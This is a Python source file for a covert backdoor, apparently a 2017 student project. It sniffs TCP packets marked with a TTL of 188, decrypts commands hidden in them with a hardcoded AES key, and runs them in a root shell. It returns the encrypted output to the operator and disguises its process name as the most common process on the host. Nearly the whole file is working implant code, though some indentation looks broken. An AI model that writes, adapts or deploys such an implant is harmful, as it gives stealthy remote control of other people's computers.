#  =================================================================
#  	SOURCE FILE: backdoor.py
#  
#
#	DATE: October 23rd 2017
#  
#  
#  	AUTHOR: Paul Cabanez, Justin Chau
#
#	
#	DESCRIPTION: This is a backdoor program ran on the victim computer.
#		It works with client.py where it is place on a seperate computer.
#		Receives commands from client.py and executes it on the workstation
#		and replies back to the client with information
#	
#
#	LAST REVISED: October 19th 2017
#  =================================================================

import argparse
import setproctitle #pip install setproctitle
import time
import base64
import logging #pip install logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * #sudo apt-get install python-scapy
from subprocess import *
from Crypto.Cipher import AES
import ConfigParser


configParser = ConfigParser.RawConfigParser()
configPath = r'config.txt'
configParser.read(configPath)

##read config file and settings
key = configParser.get('config','password')
directory = configParser.get('config', 'fileDir')
srcIP = configParser.get('config', 'srcIP')
destIP = configParser.get('config', 'destIP')
destPort = configParser.get('config', 'destPort')

CONN_IPS = {}
MASTER_KEY = "EncryptDecryptDataSentByBackdoor"
SALT = "JstinPaulCabanez"

#  =================================================================
#  name: encryption
#  @param:
#		text 			- the plaintext that will be encrypted
#
#  @return
#		encryptedText 	- the encrypted plaintext
#
#  description: encrypts data given
#  =================================================================
def encryption(text):
	secretKey = AES.new(MASTER_KEY,AES.MODE_CFB, SALT)
	padding = (AES.block_size - len(str(text)) % AES.block_size) * "\0"
	plainTextWithPadding = str(text) + padding
	cipherText = base64.b64encode(secretKey.encrypt(plainTextWithPadding))
  
	return cipherText
	
#  =================================================================
#  name: decryption
#  @param:
#		encryptedText 	- the encrypted text that will be decrypted
#
#  @return
#		plainText 		- the decrypted text
#
#  description: decrypts encrypted data given
#  ================================================================= 	
def decryption(encrypted_text):
	missing_padding = len(encrypted_text) % 4
	if missing_padding != 0:
		encrypted_text += b'='* (4 - missing_padding)
	secretKey = AES.new(MASTER_KEY,AES.MODE_CFB, SALT)
	plainTextWithPadding = secretKey.decrypt(base64.b64decode(encrypted_text))
	plainText = plainTextWithPadding.rstrip("\0")
  
	return plainText
	
#  =================================================================
#  name: verify_root
#  @param:
#		none
#  @return
#  		none
#
#  description: verify if the program is ran in root if not exit the program
#  =================================================================
def verify_root():
	if(os.getuid() != 0):
			exit("This program is not in root/sudo")

#  =================================================================
#  name: print_payload
#  @param
#		packet 	- packet received by the sniff
#
#  @return
#		none
#  			
#  description: receives a packet and prints the the payload
#  =================================================================	
def print_payload(packet):
	try:
		data = packet['Raw'].load
		print(decryption(data))
	except IndexError:
		pass
		
#  ================================================================= 
#  name: mask
#  @param
#		none
#
#  @return
#		none
#
#  description: grabs the most used process and masks itself as that process
#  =================================================================
def mask():
	command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
	commandResult = command.read()
	setproctitle.setproctitle(commandResult)
	print "Most common process: {0}".format(commandResult)	

#  =================================================================
#  name: sendpkt
#  @param:
#		packet 	- the packet that needs to be sent crafted by scapy
#  @return
#		none  
#
#  description: send packet to the location described in the packet
#  =================================================================
def sendpkt(packet):
	send(packet)	

#  =================================================================
#  name: sendCmd
#  @param:
#		destIP 	- destination IP that the packet will be sent to
#
#		port 	- destination port the packet will sent through
#
#		data	- the encrypted returning data to send
#
#  @return
#		none
#  
#  description: crafts packet using scapy
#  =================================================================
def sendData(destIP, port , data):
	packet = IP(dst=destIP) / TCP(dport=port) / Raw(load=encryption(data))
	sendpkt(packet)
	
#  =================================================================
#  name: encryption
#  @param
#  @return
#  ================================================================= 
def runCmd(packet):
	if IP in packet[0]:
		ttl = packet[IP].ttl
        #Confirm the filter - double check that the data is coming from the expected address.
        if ttl == 188:
            destPort = packet[TCP].dport
            srcIPAddr = packet[IP].src
            dstIPAddr = packet[IP].dst
            #Decrypt the extracted command from the raw layer.
            command = decryption(packet[Raw].load)
            #Pipe the command to a shell subprocess to receive the output
            process = subprocess.Popen(command, shell=True, stdout= subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = process.communicate()
            #Concatenate the shell output to a variable prepped to send back to client.
            data = stdout + stderr
            if data.strip() == "":
                data = "No output generated from command: " + command
            #Encrypt the shell output.
            print "Sending: " + data
            encryptedOutput = encryption(data)
            #Craft a packet with the encrypted output data and send back to client.
            craftedPacket = IP(dst=srcIPAddr, ttl=188)/TCP(dport=destPort)/Raw(load=encryptedOutput)
            time.sleep(0.1)
            send(craftedPacket, verbose=0)
       
#  =================================================================
#  name: packetCheck
#  @param:
#		packet 	- a packet that is received by the sniff
#  @return
#		True 	- if packet is the right packet from the backdoor.py
#
#		False 	- if the packet is not the correct packet to be received
#
#  description: checks if the packet has the right format  
#  =================================================================
def packetCheck(packet):
	if IP in packet[0] and Raw in packet[2]:
		if packet[IP].ttl == 188:
			return True
		else:
			return False
			
#  =================================================================
#  name: main
#  @param
#		none
#  @return
#		none
#  
#  ================================================================= 
def main():
    verify_root()
    mask()
    
    parser = argparse.ArgumentParser("Backdoor")
    parser.add_argument("-i", "--iface", help="Interface to sniff packets on")
    args = parser.parse_args()
    
    print("Looking for traffic..")
    
    if(args.iface is None):
        sniff(filter="tcp", prn=runCmd)
    else:
		sniff(filter="tcp", iface=args.iface, prn=runCmd, stop_filter=packetCheck)
		
		
if __name__ == '__main__':
	try:
		while True:
			main()
	except KeyboardInterrupt:
			exit("Exiting....")
